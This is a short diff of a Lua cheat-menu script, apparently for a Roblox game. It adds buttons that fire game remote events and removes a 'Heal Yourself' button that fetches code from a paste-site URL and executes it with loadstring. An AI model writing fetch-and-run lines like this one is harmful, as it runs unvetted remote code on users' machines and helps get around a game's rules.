@@ -70,13 +70,6 @@ MainSection:NewButton("Drown Cat {Coming Soon!}", "Befriending Cat", function()
         
 end)
 
-MainSection:NewButton("Heal Yourself", "Healing YourSelf!", function()
-        loadstring(game:HttpGet("https://controlc.com/236e54ed"))()
-end)
-
-
-
-
 MainSection:NewButton("Turn On Basement Light", "Turn ons Basement light", function()
         local Event = game:GetService("ReplicatedStorage").RemoteEvents.BasementMission
         Event:FireServer()
